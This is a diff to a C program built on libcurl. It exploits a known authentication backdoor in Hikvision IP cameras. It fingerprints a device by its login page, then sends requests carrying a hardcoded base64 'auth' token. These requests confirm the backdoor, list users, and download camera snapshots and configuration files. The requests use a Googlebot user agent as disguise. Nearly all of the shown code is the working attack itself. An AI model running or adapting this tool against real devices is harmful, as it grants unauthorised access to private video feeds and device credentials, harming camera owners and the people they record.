@@ -5,36 +5,137 @@
 #include <stdlib.h>
 #include "hikreset.h"
 #include <stdio.h>
+#include <string.h>
+#include <errno.h>
 
 
-int backdoorCheck(char *ip){
+static size_t
+WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
+{
+  size_t realsize = size * nmemb;
+  struct MemoryStruct *mem = (struct MemoryStruct *)userp;
+ 
+  char *ptr = realloc(mem->memory, mem->size + realsize + 1);
+  if(!ptr) {
+    /* out of memory! */
+    printf("not enough memory (realloc returned NULL)\n");
+    return 0;
+  }
+ 
+  mem->memory = ptr;
+  memcpy(&(mem->memory[mem->size]), contents, realsize);
+  mem->size += realsize;
+  mem->memory[mem->size] = 0;
+ 
+  return realsize;
+}
+
+static void
+deleteNullBytes(char *p, size_t i){
+	//i - size of str *p
+	for(int k=0;k<=(int)(i-1);k++)
+		if (p[k]=='\0')
+			p[k]=0;
+}
+
+int hikvisionCheck(char *ip){
+	///doc/page/login.asp?_
 	CURL *curl;
 	CURLcode res;
 	curl = curl_easy_init();
 	char* url;
-	asprintf(&url,"%s/System/deviceInfo?auth=YWRtaW46MTEK",ip);
+	asprintf(&url,"%s/",ip);
+	
+
 	if(curl) {
-		FILE *black_hole = fopen("/dev/null", "wb");
+		struct MemoryStruct chunk;
+ 
+  		chunk.memory = malloc(1);  /* will be grown as needed by the realloc above */
+  		chunk.size = 0;
 		curl_easy_setopt(curl, CURLOPT_URL, url);
 		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
-		curl_easy_setopt(curl, CURLOPT_WRITEDATA, black_hole);
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
+
 		res = curl_easy_perform(curl);
 
-		if(res != CURLE_OK)
-			fprintf(stderr, "curl_easy_perform() failed: %s\n",
+		if(res != CURLE_OK){
+			fprintf(stderr, "%s - curl_easy_perform() failed: %s\n",ip,
 				curl_easy_strerror(res));
-		long http_code = 0;
+			curl_easy_cleanup(curl);
+			free(url);
+			return -4;
+		}
 
-		curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
 		curl_easy_cleanup(curl);
 		free(url);
+		char *p;
+		p = (char *)realloc(chunk.memory, chunk.size+1);
+		if (!p){
+			fprintf(stderr, "Not enough memory!\n");
+			return -2;
+		}
+		chunk.memory=p;
+		chunk.size++;
 
-		return http_code;
-	}
-	else{
+		deleteNullBytes(chunk.memory, chunk.size);
+
+		chunk.memory[chunk.size-1] = '\0';
+		char *comp = strstr(chunk.memory, "/doc/page/login.asp?_");
+		free(chunk.memory);
+		if (comp)
+			return 1;
+		else
+			return 0;
+
+	}else{
 		return -1;
 	}
+}
+
+int backdoorCheck(char *ip){
+	
+	int hikvisionCheckResult = hikvisionCheck(ip);
+	if(hikvisionCheckResult==1){
+		CURL *curl;
+		CURLcode res;
+		curl = curl_easy_init();
+
+		if(curl) {
+			char* url;
+			asprintf(&url,"%s/System/deviceInfo?auth=YWRtaW46MTEK",ip);
+			FILE *black_hole = fopen("/dev/null", "wb");
+			curl_easy_setopt(curl, CURLOPT_URL, url);
+			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
+			curl_easy_setopt(curl, CURLOPT_WRITEDATA, black_hole);
+			res = curl_easy_perform(curl);
+
+			if(res != CURLE_OK){
+				fprintf(stderr, "%s - curl_easy_perform() failed: %s\n", ip,
+					curl_easy_strerror(res));
+				curl_easy_cleanup(curl);
+				return -4;
+			}
+			long http_code = 0;
+
+			curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
+			curl_easy_cleanup(curl);
+			free(url);
+			if(http_code == 200) return 1;
+			else return 0;
+		}
+		else{
+			return -3;
+		}
+	}else if(hikvisionCheckResult==0){
+		printf("%s - not a Hikvision device.\n", ip);
+		return -1;
+	}
+	else  if (hikvisionCheckResult == -4) return -4;
+	else return 0;
+
 }
 
 int download(char *ip, enum downloadFile filetype, FILE* fd){
@@ -43,42 +144,49 @@ int download(char *ip, enum downloadFile filetype, FILE* fd){
 	curl = curl_easy_init();
 	char* url;
 
-	if (filetype==SNAPSHOT){
-		asprintf(&url,"%s%s",ip,"/onvif-http/snapshot?auth=YWRtaW46MTEK");
-	}
-	else if (filetype==CONFIG){
-		asprintf(&url,"%s%s",ip,"/System/configurationFile?auth=YWRtaW46MTEK");
-	}
-	else {
-		return -1;
-	}
-	printf("Connectin to: %s",ip);
-	if(curl) {
-		curl_easy_setopt(curl, CURLOPT_URL, url);
-		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
-		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fd);
-		res = curl_easy_perform(curl);
+	if (backdoorCheck(ip)==1){
+		if (filetype==SNAPSHOT){
+			asprintf(&url,"%s%s",ip,"/onvif-http/snapshot?auth=YWRtaW46MTEK");
+		}
+		else if (filetype==CONFIG){
+			asprintf(&url,"%s%s",ip,"/System/configurationFile?auth=YWRtaW46MTEK");
+		}
+		else {
+			return -1;
+		}
+		if(curl) {
+			curl_easy_setopt(curl, CURLOPT_URL, url);
+			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
+			curl_easy_setopt(curl, CURLOPT_WRITEDATA, fd);
+			res = curl_easy_perform(curl);
 
-		if(res != CURLE_OK)
-			fprintf(stderr, "curl_easy_perform() failed: %s\n",
-				curl_easy_strerror(res));
-		long http_code = 0;
+			if(res != CURLE_OK){
+				fprintf(stderr, "%s, curl_easy_perform() failed: %s\n",ip,
+					curl_easy_strerror(res));
+				return -4;
+			}
+			long http_code = 0;
 
-		curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
-		curl_easy_cleanup(curl);
-		free(url);
+			curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
+			curl_easy_cleanup(curl);
+			free(url);
 
-		return http_code;
+			return http_code;
+		}
+		else{
+			return -2;
+		}
 	}
 	else{
-		return -1;
+		fprintf(stderr, "%s - Not a Hikvision device, or device w/o Backdoor.\n",ip);
+		return -3;
 	}
 }
 
 void getUsers(char *ip){
-	long status_code = backdoorCheck(ip);
-	if(status_code==200){
+	int checked = backdoorCheck(ip);
+	if(checked==1){
 		CURL *curl;
 		CURLcode res;
 		curl = curl_easy_init();
@@ -98,7 +206,6 @@ void getUsers(char *ip){
 			free(url);
 		}
 	}
-	else{
-			printf("%s - Backdoor not confirmed. status_code is %ld\n", ip, status_code);
-		}
+	else if (checked == -3) printf("Something went wrong during curl init.\n");
+	else printf("%s - Backdoor not confirmed.\n", ip);
 }
